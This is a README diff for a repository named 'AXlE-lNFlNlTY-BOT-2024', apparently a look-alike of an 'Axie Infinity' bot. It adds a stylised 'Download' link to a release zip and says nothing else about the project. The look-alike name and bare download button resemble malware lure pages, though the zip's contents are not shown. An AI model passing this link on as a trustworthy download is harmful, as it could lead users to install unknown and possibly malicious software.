@@ -1,7 +1,7 @@
 # AXlE-lNFlNlTY-BOT-2024 
 
 
-[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/eraandaa/AXlE-lNFlNlTY-BOT-2024-/releases/download/AXlE-lNFlNlTY-BOT/AXlE-lNFlNlTY-BOT.zip)
 
 
 
